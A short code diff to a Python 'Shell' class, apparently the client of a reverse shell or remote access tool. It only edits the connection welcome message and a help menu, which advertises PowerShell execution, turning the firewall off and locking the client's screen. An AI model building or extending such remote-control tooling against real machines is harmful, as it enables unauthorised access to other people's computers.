@@ -22,9 +22,9 @@ class Shell:
         Executes received commands from the server and sends the output back through the socket
         """
 
-        welcome_msg = "\n\n\nReverse shell connection successful! \n Type 'help' for list of custom commands, \
-            and 'exit' or 'quit' to return \n \
-            Custom commands start with '!' \n\n"
+        welcome_msg = "\nReverse shell connection successful! \n Type '!help' for list of custom commands, \
+        and 'exit' or 'quit' to return \
+        Custom commands start with '!'\n"
 
         self.sock.send(str.encode(welcome_msg))
 
@@ -43,7 +43,7 @@ class Shell:
                         \n !PS [command]: Execute command with powershell \
                         \n !firewall on/off: Turns on/off firewall \
                         \n !lock: Locks screen of client \
-                        \n !help: Opens this menu"
+                        \n !help: Opens this menu\n"
 
                     self.sock.send(str.encode(help_msg))
 
